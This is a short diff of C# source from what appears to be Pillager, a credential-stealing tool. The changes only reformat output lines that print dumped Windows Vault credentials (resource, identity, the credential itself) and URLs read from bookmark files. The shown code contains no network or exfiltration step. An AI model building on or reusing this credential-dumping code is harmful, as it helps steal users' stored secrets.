@@ -3,9 +3,7 @@ using Pillager.Helper;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -190,24 +188,24 @@ namespace Pillager.Browsers
                         }
                         if (cred != null) // Indicates successful fetch
                         {
-                            sb.AppendLine("\tVault Type   : {"+ vaultType + "}");
+                            sb.AppendLine("Vault Type   : {"+ vaultType + "}");
                             object resource = GetVaultElementValue(pResourceElement);
                             if (resource != null)
                             {
-                                sb.AppendLine("\tVault Type   : {" + resource + "}");
+                                sb.AppendLine("Vault Type   : {" + resource + "}");
                             }
                             object identity = GetVaultElementValue(pIdentityElement);
                             if (identity != null)
                             {
-                                sb.AppendLine("\tVault Type   : {" + identity + "}");
+                                sb.AppendLine("Vault Type   : {" + identity + "}");
                             }
                             if (packageSid != null)
                             {
-                                sb.AppendLine("\tVault Type   : {" + packageSid + "}");
+                                sb.AppendLine("Vault Type   : {" + packageSid + "}");
                             }
-                            sb.AppendLine("\tVault Type   : {" + cred + "}");
+                            sb.AppendLine("Vault Type   : {" + cred + "}");
                             // Stupid datetime
-                            sb.AppendLine("\tLastModified : {"+ DateTime.FromFileTimeUtc((long)lastModified) + "}");
+                            sb.AppendLine("LastModified : {"+ DateTime.FromFileTimeUtc((long)lastModified) + "}");
                             sb.AppendLine();
                         }
                     }
@@ -254,8 +252,8 @@ namespace Pillager.Browsers
                 {
                     string booktext = File.ReadAllText(url_file_path);
                     Match match = Regex.Match(booktext, @"URL=(.*?)\n");
-                    sb.AppendLine($"\t{url_file_path}");
-                    sb.AppendLine($"\t\t{match.Value}");
+                    sb.AppendLine($"{url_file_path}");
+                    sb.AppendLine($"\t{match.Value}");
 
                 }
             }
